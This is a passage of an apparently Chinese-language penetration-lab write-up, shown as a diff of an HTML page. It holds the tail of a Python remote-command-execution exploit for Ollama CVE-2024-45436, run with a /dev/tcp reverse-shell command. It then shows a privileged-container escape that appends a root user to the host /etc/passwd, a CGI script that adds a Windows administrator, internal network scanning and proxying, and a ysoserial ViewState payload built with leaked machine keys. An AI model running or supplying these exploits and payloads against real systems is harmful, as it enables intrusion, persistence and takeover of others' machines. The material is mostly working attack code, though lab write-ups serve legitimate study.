+</span></span><span class="line"><span class="cl">            <span class="n">json_content</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;all-minilm:22m&#34;</span><span class="p">,</span> <span class="s2">&#34;modelfile&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;FROM /tmp/all-minilm-22m.gguf&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s2">/api/create&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">},</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">data</span><span class="o">=</span><span class="n">json_content</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">cleanup</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Clean up temporary files&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;tmp.c&#39;</span><span class="p">,</span> <span class="s1">&#39;hook.so&#39;</span><span class="p">,</span> <span class="s1">&#39;evil.zip&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Ollama CVE-2024-45436 Remote Command Execution Exploit&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;target&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Target URL (e.g. http://example.com:11434)&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;command&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Command to execute on the target&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--no-cleanup&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_true&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Do not remove temporary files&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">=== Ollama CVE-2024-45436 Exploit ===</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Format and validate the URL</span>
+</span></span><span class="line"><span class="cl">    <span class="n">target_url</span> <span class="o">=</span> <span class="n">format_url</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_status</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Target: </span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_status</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Command: </span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">command</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Check if target is vulnerable</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Checking if target is vulnerable...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">check_vulnerability</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Target does not appear to be vulnerable&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Target is vulnerable!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Create malicious shared object</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Creating malicious shared object...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">create_malicious_so</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">command</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Failed to create shared object&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cleanup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Create malicious ZIP</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Creating ZIP payload...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">create_malicious_zip</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Failed to create ZIP payload&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cleanup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Upload payload</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Uploading payload...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">blob_name</span> <span class="o">=</span> <span class="n">upload_payload</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">blob_name</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Failed to upload payload&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cleanup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_status</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Payload uploaded: </span><span class="si">{</span><span class="n">blob_name</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Create model with payload</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Creating model...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">create_model</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">blob_name</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="s1">&#39;-&#39;</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Failed to create model&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cleanup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Trigger execution</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Triggering exploitation...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">success</span> <span class="o">=</span> <span class="n">trigger_execution</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Clean up</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">no_cleanup</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Cleaning up temporary files...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cleanup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">success</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n\033</span><span class="s2">[92m[✓] Exploit completed successfully!</span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n\033</span><span class="s2">[91m[✗] Exploit may have failed. Check if your command executed.</span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[93m    Note: Some commands may execute silently. Check your listener if applicable.</span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">=== Exploit finished ===</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">bash</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="bash"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">python3 exp.py http://172.22.10.17:11434 <span class="s2">&#34;/bin/sh -i &gt;&amp; /dev/tcp/172.22.10.22/9999 0&gt;&amp;1&#34;</span>
+</span></span></code></pre></div></div><p>弹完 shell 后发现是个 docker 环境</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">bash</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="bash"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="c1"># cat /proc/self/status | grep CapEff</span>
+</span></span><span class="line"><span class="cl">CapEff:	0000003fffffffff
+</span></span></code></pre></div></div><p>特权启动,没什么好说的, 直接挂载了</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">bash</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="bash"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">mkdir -p /test <span class="o">&amp;&amp;</span> mount /dev/vda3 /test
+</span></span></code></pre></div></div><p>写个用户 <code>new:123</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">bash</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="bash"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">bmV3OiQxJG5ldyRwN3B0a0VLVTFIbmFIcFJ0ek5pelMxOjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA</span><span class="o">==</span> <span class="p">|</span> base64 -d &gt;&gt; /test/etc/passwd
+</span></span></code></pre></div></div><h3 id="172.22.10.88">172.22.10.88</h3>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250809033009.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250809033009.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>给一个我的示例</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">SetHandler cgi-script
+</span></span><span class="line"><span class="cl">Options ExecCGI
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">bat</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="bat"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="p">@</span><span class="k">echo</span> off
+</span></span><span class="line"><span class="cl"><span class="c1">REM CGI 必须先输出响应头</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> Content-Type: text/plain
+</span></span><span class="line"><span class="cl"><span class="k">echo</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;12dakdsjaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdaaaaaasdddddddddddddddd3&#34;&#34;12dakdsjaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdaaaaaasdddddddddddddddd3&#34;&#34;12dakdsjaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdaaaaaasdddddddddddddddd3&#34;&#34;12dakdsjaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdaaaaaasdddddddddddddddd3&#34;&#34;12dakdsjaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdaaaaaasdddddddddddddddd3&#34;&#34;12dakdsjaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdaaaaaasdddddddddddddddd3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;12dakdsjaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdaaaaaasdddddddddddddddd3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;12dakdsjaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdaaaaaasdddddddddddddddd3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;12dakdsjaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdaaaaaasdddddddddddddddd3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;12dakdsjaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdaaaaaasdddddddddddddddd3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;12dakdsjaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdaaaaaasdddddddddddddddd3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;12dakdsjaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdaaaaaasdddddddddddddddd3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;12dakdsjaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasdaaaaaasdddddddddddddddd3&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span>:
+</span></span><span class="line"><span class="cl"><span class="k">dir</span> C:\Users\Administrator\Desktop\
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span>:
+</span></span><span class="line"><span class="cl"><span class="k">type</span> C:\Users\Administrator\Desktop\f1ag.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span>:
+</span></span><span class="line"><span class="cl">net user dionysus qwer1234! /add <span class="p">&amp;&amp;</span> net localgroup administrators dionysus /add
+</span></span></code></pre></div></div><h3 id="172.22.10.7">172.22.10.7</h3>
+<p>纯屎, 屎中屎中屎</p>
+<p>端口是 8080, <code>/h2-console</code></p>
+<p>给了 postgresql jdbc依赖,</p>
+<p>不出外网, 只开了 8080 端口, 内部探测有 139 445 3389, 确定是 Windows 机器</p>
+<h2 id="域内">域内</h2>
+<p>ollama 打进来有两个网段</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+</span></span><span class="line"><span class="cl">        inet 172.22.10.17  netmask 255.255.255.0  broadcast 172.22.10.255
+</span></span><span class="line"><span class="cl">        inet6 fe80::216:3eff:fe09:530f  prefixlen 64  scopeid 0x20&lt;link&gt;
+</span></span><span class="line"><span class="cl">        ether 00:16:3e:09:53:0f  txqueuelen 1000  (Ethernet)
+</span></span><span class="line"><span class="cl">        RX packets 131279  bytes 192562970 (192.5 MB)
+</span></span><span class="line"><span class="cl">        RX errors 0  dropped 0  overruns 0  frame 0
+</span></span><span class="line"><span class="cl">        TX packets 6987  bytes 522365 (522.3 KB)
+</span></span><span class="line"><span class="cl">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+</span></span><span class="line"><span class="cl">        inet 172.22.20.11  netmask 255.255.255.0  broadcast 172.22.20.255
+</span></span><span class="line"><span class="cl">        inet6 fe80::216:3eff:fe09:5339  prefixlen 64  scopeid 0x20&lt;link&gt;
+</span></span><span class="line"><span class="cl">        ether 00:16:3e:09:53:39  txqueuelen 1000  (Ethernet)
+</span></span><span class="line"><span class="cl">        RX packets 5729  bytes 645297 (645.2 KB)
+</span></span><span class="line"><span class="cl">        RX errors 0  dropped 0  overruns 0  frame 0
+</span></span><span class="line"><span class="cl">        TX packets 7298  bytes 693521 (693.5 KB)
+</span></span><span class="line"><span class="cl">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span></span></code></pre></div></div><p>先搜集一下信息</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">(icmp) Target 172.22.20.11    is alive (本机)
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.20.25    is alive
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.20.32    is alive
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.20.38    is alive
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.20.165   is alive
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.20.253   is alive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">start vulscan
+</span></span><span class="line"><span class="cl">[*] NetBios: 172.22.20.25    [+]DC FPCORP\FPSRVAD01         
+</span></span><span class="line"><span class="cl">[*] NetBios: 172.22.20.32    FPCORP\FPSRVFS02               
+</span></span><span class="line"><span class="cl">[*] NetBios: 172.22.20.38    FPCORP\FPSRVIIS03              
+</span></span><span class="line"><span class="cl">[*] NetBios:     FPCORP\FPSRVIIS03-2            
+</span></span><span class="line"><span class="cl">[*] NetInfo:
+</span></span><span class="line"><span class="cl">[*]172.22.20.32
+</span></span><span class="line"><span class="cl">   [-&gt;]FPSRVFS02
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.20.32
+</span></span><span class="line"><span class="cl">[*] NetInfo:
+</span></span><span class="line"><span class="cl">[*]172.22.20.38
+</span></span><span class="line"><span class="cl">   [-&gt;]FPSRVIIS03
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.20.38
+</span></span><span class="line"><span class="cl">[*] NetInfo:
+</span></span><span class="line"><span class="cl">[*]172.22.20.25
+</span></span><span class="line"><span class="cl">   [-&gt;]FPSRVAD01
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.20.25
+</span></span><span class="line"><span class="cl">[*] WebTitle: http://172.22.20.38       code:404 len:315    title:Not Found
+</span></span><span class="line"><span class="cl">[*] NetInfo:
+</span></span><span class="line"><span class="cl">[*]172.22.20.165
+</span></span><span class="line"><span class="cl">   [-&gt;]FPSRVIIS03-2
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.20.165
+</span></span><span class="line"><span class="cl">[+] ftp://172.22.20.38:21:anonymous 
+</span></span><span class="line"><span class="cl">   [-&gt;]WebDeploy
+</span></span><span class="line"><span class="cl">[*] WebTitle: http://172.22.20.38:8080  code:200 len:5078   title:IntraFetch
+</span></span><span class="line"><span class="cl">[*] WebTitle: https://172.22.20.38:8172 code:404 len:0      title:None
+</span></span></code></pre></div></div><p>做代理</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">ssh -J root@8.145.34.121 -D 0.0.0.0:1081 -N -f root@172.22.10.17 
+</span></span></code></pre></div></div><h3 id="172.22.20.38">172.22.20.38</h3>
+<p>依旧ftp</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">125 Data connection already open; Transfer starting.
+</span></span><span class="line"><span class="cl">07-04-25  09:58AM                 3498 package.deploy-readme.txt
+</span></span><span class="line"><span class="cl">07-04-25  09:58AM                14441 package.deploy.cmd
+</span></span><span class="line"><span class="cl">07-04-25  09:58AM                  446 package.SetParameters.xml
+</span></span><span class="line"><span class="cl">07-04-25  09:58AM                  543 package.SourceManifest.xml
+</span></span><span class="line"><span class="cl">07-04-25  09:58AM             12105992 package.zip
+</span></span><span class="line"><span class="cl">226 Transfer complete.
+</span></span><span class="line"><span class="cl">ftp&gt; 
+</span></span></code></pre></div></div><p>分析一下就知道是 net 反序列化, 收集几个关键的数据</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">验证密钥validationKey配置为1B7E26950A9C9ABFE4FE72FF25649D4DC4CA6286F3943D3ABB1B70AC6D81142D000CC3880E137C49954EF6284980381A2C674F785C13C960BDE13CB2595873FD
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">解密密钥decryptionKey配置为6424A8B2C8CE51FEFECBDBE795A8F33EBD81234CB655F610EEC49CFA13F89CC1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">验证算法validation配置为SHA1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">解密算法decryption配置为AES
+</span></span></code></pre></div></div><p>最终 poc, 注意一下 <code>csrf_token</code> 作为了<code>viewstateuserkey</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">.\ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck -c &#34;ignore&#34; --path=&#34;/Default.aspx&#34; --apppath=&#34;/&#34; --decryptionalg=&#34;AES&#34; --decryptionkey=&#34;6424A8B2C8CE51FEFECBDBE795A8F33EBD81234CB655F610EEC49CFA13F89CC1&#34; --validationalg=&#34;SHA1&#34; --validationkey=&#34;1B7E26950A9C9ABFE4FE72FF25649D4DC4CA6286F3943D3ABB1B70AC6D81142D000CC3880E137C49954EF6284980381A2C674F785C13C960BDE13CB2595873FD&#34; --viewstateuserkey=&#34;b542e0802c6d419cbb7d7a0d9ac29db1&#34; --isdebug
+</span></span><span class="line"><span class="cl">
